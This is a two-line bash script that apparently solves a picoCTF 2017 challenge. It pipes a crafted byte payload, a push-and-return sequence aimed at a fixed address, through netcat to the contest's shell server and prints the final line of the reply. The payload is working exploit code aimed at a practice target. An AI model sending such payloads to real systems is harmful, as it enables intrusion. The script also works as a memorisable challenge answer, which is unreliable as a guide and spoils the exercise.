#! /bin/bash

python -c 'print "h@\x85\x04\x08\xc3"' | nc shell2017.picoctf.com 63545 | tail -n 1
